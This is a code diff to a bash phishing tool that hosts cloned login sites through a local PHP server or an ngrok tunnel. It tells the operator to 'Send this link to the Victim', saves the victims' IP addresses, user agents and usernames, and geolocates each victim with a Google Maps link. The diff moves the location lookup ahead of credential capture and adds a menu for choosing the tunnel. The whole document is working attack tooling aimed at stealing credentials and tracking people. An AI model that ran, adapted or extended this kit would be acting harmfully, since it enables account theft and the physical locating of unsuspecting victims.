@@ -210,7 +210,7 @@ catch_ip() {
     printf "${GREEN}[-]${ORANGE} User-Agent:${GREEN} %s\e[0m\n" $ua
     printf "${GREEN}[-]${ORANGE} Saved:${GREEN} %s/saved.ip.txt\e[0m\n" $website
     cat sites/$website/ip.txt >> sites/$website/saved.ip.txt
-    getcredentials
+    ip_location
 }
 
 getcredentials() {
@@ -235,20 +235,7 @@ catch_cred() {
     printf "${GREEN}[-]${ORANGE} Saved:${RED} sites/%s/saved.usernames.txt \n" $website
     killall -2 php > /dev/null 2>&1
     killall -2 ngrok > /dev/null 2>&1
-    printf "\n"
-    printf "${RED}[01]${CYAN} IP Details\n"
-    printf "${RED}[02]${CYAN} Back to Main Menu\n"
-    read -p "${YELLOW}Option >>> ${GRAY} " op
-    if [[ $op == 1 ]]; then
-    sleep 1
-    ip_location
-    elif [[ $op == 2 ]]; then
-    sleep 1
-    { clear ; Banner ; Main ; }
-    else
-    printf "${RED}Invaild Options .. "
-    exit 0
-    fi
+    exit 1
 }
 
 ip_location() {
@@ -264,11 +251,9 @@ ip_location() {
     usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-    userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
     printf "${CYAN} Victim IP Details ....\n"
+    printf "${RED}..........................................................................................\n"
     printf "\n"
     printf "  ${ORANGE}  City >>         ${GREEN}   $usercity\n"
     printf "  ${ORANGE}  Region >>       ${GREEN}   $useregion\n"
@@ -278,12 +263,10 @@ ip_location() {
     printf "  ${ORANGE}  Time Zone >>    ${GREEN}    $usertime\n"
     printf "  ${ORANGE}  Postal Code >>  ${GREEN}    $userpostal\n"
     printf "  ${ORANGE}  Carrier >>      ${GREEN}   $userisp\n"
-    printf "  ${ORANGE}  Country Code >> ${GREEN}   $usercountrycode\n"
-    printf "  ${ORANGE}  Currency >>     ${GREEN}   $usercurrency\n"
-    printf "  ${ORANGE}  Languages >>    ${GREEN}   $userlanguage\n"
     printf "  ${ORANGE}  Calling Code >> ${GREEN}   $usercalling\n"
     printf "  ${ORANGE}  Google Location >> ${CYAN} https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
-    exit 1
+    printf "${RED}..........................................................................................\n"
+    getcredentials
 }
 
 start() {
@@ -295,6 +278,24 @@ start() {
     rm -rf sites/$website/usernames.txt
 
     fi
+    printf "${GREEN}[1]${ORANGE}Localhost\n"
+    printf "${GREEN}[2]${ORANGE}Ngrok\n"
+    printf "\n"
+    read -p "${GREEN}[+]${YELLOW}Tunnel Option -->> " tunnel
+    if [[ $tunnel == 1 ]]; then
+    printf "${RED}[#]${BLUE} Starting php server ...\n"
+    cd sites/$website && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+    sleep 2
+
+    printf "${RED}### ${YELLOW}Send this link to the Victim: ${CYAN} http://127.0.0.1:3333 \n" 
+    checkfound 
+    elif [[ $tunnel == 2 ]]; then
+    tunnel
+    else
+    printf "Invaild Option ...\n"
+    fi
+}
+tunnel() {
     if [[ -e ngrok ]]; then
     echo ""
     else
@@ -439,3 +440,4 @@ Banner() {
 Need
 Banner
 Main
+
